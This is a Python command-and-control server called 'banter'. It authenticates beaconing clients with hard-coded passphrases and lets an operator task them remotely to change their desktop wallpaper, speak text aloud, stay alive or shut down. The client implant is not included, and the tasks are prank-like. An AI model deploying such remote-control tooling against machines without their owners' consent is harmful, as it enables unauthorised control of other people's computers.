# banter
import socket
import sys
import threading
import logging
import time
import copy


class Master():

    def __init__(self):
        logging.basicConfig(level=logging.NOTSET)
        logging.debug("Starting up")
        self.PORT = 34072
        self.TASKING_PORT = 34073
        self.SERVING_PORT = 34074
        self.BUFFER_SIZE = 8192
        self.TASKING_WINDOW = 10
        self.CLIENT_LIMIT = 20
        # No. of unacked commands before client is removed
        self.UNACKED_LIMIT = 3
        # How many times to attempt a connection before aborting
        self.CONNECTION_ATTEMPT_LIMIT = 5

        # Dict of client address : counter of unacked messages
        # {address: unacked_counter}
        self.authed_clients = {}
        self.client_names = {}

        self.t1 = threading.Thread(target=self.listen)
        self.t1.setDaemon(True)
        self.t2 = threading.Thread(target=self.cli)
        self.t1.start()
        self.t2.start()

    """ Connection listener and related functionality """
    """ Listen for new clients and record connection details """
    def listen(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.bind(('', self.PORT))
        logging.debug("Listening for clients on port {0}".format(self.PORT))

        while True:
            try:
                # Accept new connections
                data, addr = sock.recvfrom(self.BUFFER_SIZE)
                logging.debug("{0} > '{1}'".format(addr, data))

                if self.authenticate_client(data):
                    sock.sendto(b"RockMelon69", addr)
                    logging.debug("{0} < '{1}'".format(addr[0], b"RockMelon69"))
                    data, _ = sock.recvfrom(self.BUFFER_SIZE)
                    if data[-7:] == b"BossTha":
                        logging.debug("{0} > '{1}'".format(addr[0], data))
                        name = str(data[:-7], "ascii")
                        logging.info("New client: {0}/{1}".format(addr[0], name))
                        self.authed_clients[addr[0]] = 0
                        self.client_names[addr[0]] = name
                elif addr[0] in self.authed_clients:
                    if data == b"Jobs done!":
                        print("Task completed successfully.")
                    elif data == b"Nope":
                        print("Task failed.")
            except ConnectionResetError:
                logging.debug("Connection reset: {0}".format(addr))
            except socket.timeout:
                time.sleep(1)
            except Exception as e:
                logging.warn("Unhandled Exception: {0}".format(e))

    """ Only accept clients who send the secret phrase """
    def authenticate_client(self, data):
        if data == b"Speak friend and enter":
            return True
        else:
            return False

    """ CLI/tasking and related functionality """
    """ Command line interface """
    def cli(self):
        while True:
            cmd = input("banter> ")
            self.parse_cmd(cmd)

    """ CLI command parsing """
    def parse_cmd(self, cmd):
        cmd = cmd.split(" ")
        if cmd[0] == "help" or cmd[0] == "?":
            print("In development...")
            print(" * hi")
            print(" * listclients, lc")
            print(" * kill, kys <target>")
            print(" * changebackground, cb <target> <image_file>")
            print(" * speak, ss <target> <sentence>")
            print(" * stayalive, sa <target>")
            print(" * exit, quit")
        elif cmd[0] == "hi":
            print("Sending hi to clients")
            self.send_message("hi")
        elif cmd[0] in ("listclients", "lc"):
            self.display_clients()
        elif cmd[0] in ("kill", "kys"):
            self.kill_client(cmd)
        elif cmd[0] in ("changebackground", "cb"):
            self.change_background(cmd)
        elif cmd[0] in ("speak", "ss"):
            self.speak_sentence(cmd)
        elif cmd[0] in ("stayalive", "sa"):
            self.stay_alive(cmd)
        elif cmd[0] in ("exit", "quit", "q"):
            sys.exit()
        elif cmd[0] == "":
            pass
        else:
            print("Invalid command")

    """ Send tasking to client by first waiting for beacon and then tasking via the beaconing port """
    def send_message(self, msg, client=None):
        # Broadcast when client not specified
        if client is None:
            clients = set(self.authed_clients)
        # Single client message
        elif type(client) == str:
            clients = {client}
        # Multi-client message
        elif type(client) == dict:
            clients = client
        else:
            logging.warn("Error sending message")
            return
        if len(clients) == 0:
            print("No clients to send to")
            return

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        sock.bind(('', self.TASKING_PORT))
        non_beaconing = copy.deepcopy(clients)
        logging.debug("Clients to task: {0}".format(non_beaconing))
        tasking_start = time.time()
        while (time.time() < tasking_start + self.TASKING_WINDOW) and len(non_beaconing) != 0:
            try:
                data, addr = sock.recvfrom(self.BUFFER_SIZE)
                if (addr[0] in non_beaconing) and (data == b"Awaiting orders"):
                    non_beaconing.remove(addr[0])
                    try:
                        sock.sendto(bytes(msg, "ascii"), addr)
                        ack = bytes(msg[:4] + "BossTha", "ascii")
                        data, _ = sock.recvfrom(self.BUFFER_SIZE)
                        if data == ack:
                            if data == b"kysBossTha":
                                # Remove client
                                logging.info("Killed client: {0}".format(addr))
                                self.authed_clients.pop(addr[0])
                                sock.close()
                                return
                            else:
                                self.authed_clients[addr[0]] = 0
                        else:
                            # Client didn't ack tasking, increment counter
                            self.authed_clients[addr[0]] += 1
                    except ConnectionResetError:
                        self.authed_clients[addr[0]] += 1
                    except socket.timeout:
                        print("Timeout sending message to {0}".format(addr))
                    except Exception as e:
                        logging.warning("Unhandled Exception: {0}".format(e))
            except socket.timeout:
                pass
        # Increment the counters of any non-beaconing clients
        for client in non_beaconing:
            self.authed_clients[client] += 1
            # Clean up any clients we haven't heard from
            if self.authed_clients[client] >= self.UNACKED_LIMIT:
                logging.info("Lost client: {0}".format(client))
                self.authed_clients.pop(client)
                self.client_names.pop(client)
        sock.close()

    """ Client tasking """
    """ listclients command """
    # lc
    def display_clients(self):
        print("Active clients:")
        print("   (name)              |(address)      |(unacked msgs)")
        for client in self.authed_clients:
            print(" * {0:20}|{1:15}|{2:2}".format(self.client_names[client], client, str(self.authed_clients[client])))

    """ kill command """
    # kys <target>
    def kill_client(self, cmd):
        if ((len(cmd) == 2) and (cmd[1] in self.authed_clients)):
            target = cmd[1]

            # Send the task
            # kys
            self.send_message("kys", target)
        else:
            print("Invalid command")

    """ stayalive command """
    # sa <target>
    def stay_alive(self, cmd):
        if ((len(cmd) == 2) and (cmd[1] in self.authed_clients)):
            target = cmd[1]

            # Send the task
            # sa
            self.send_message("sa", target)
        else:
            print("Invalid command")

    """ speak command """
    # ss <target> <sentence>
    def speak_sentence(self, cmd):
        target = cmd[1]
        if ((len(cmd) >= 3) and (cmd[1] in self.authed_clients)):
            target = cmd[1]
            sentence = " ".join(cmd[2:])

            # Send the task
            # ss,<sentence>
            self.send_message("{0},{1}".format("ss", sentence), target)
        else:
            print("Invalid command")

    """ changebackground command """
    # cb <target> <image file>
    def change_background(self, cmd):
        if ((len(cmd) == 3) and (cmd[1] in self.authed_clients)):
            target = cmd[1]
            img_file = cmd[2]
            try:
                # TODO: Verify file is an image
                img = open(img_file, "rb")
            except FileNotFoundError:
                print("Invalid file specified.")
                return

            # Send the task
            # cb,<LISTEN_PORT>
            self.send_message("{0},{1}".format("cb", self.SERVING_PORT), target)

            # Open a new TCP socket which will serve the file
            try:
                file_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                file_sock.settimeout(10)
                file_sock.bind(('', self.SERVING_PORT))

                # Wait for the appropriate connection
                attempts = 0
                while True:
                    attempts += 1
                    if attempts > self.CONNECTION_ATTEMPT_LIMIT:
                        logging.debug("Connection failed.")
                        img.close()
                        file_sock.close()
                        return
                    try:
                        file_sock.listen(1)
                        conn, (addr, _) = file_sock.accept()
                    except socket.timeout:
                        logging.debug("Connection timed out...")
                        continue
                    data = conn.recv(self.BUFFER_SIZE)
                    logging.debug("{0} > '{1}'".format(addr, data))
                    if (addr == target) and (data == b"plsehlp"):
                        break
                    conn.close()
                data = img.read(self.BUFFER_SIZE)
                while data:
                    conn.send(data)
                    data = img.read(self.BUFFER_SIZE)
                logging.debug("{0} < '{1}'".format(addr, img_file))
                conn.close()
                file_sock.close()
                img.close()
            except Exception as e:
                logging.exception("Unhandled Exception: {0}".format(e))
        else:
            print("Invalid command")

if __name__ == "__main__":
    server = Master()
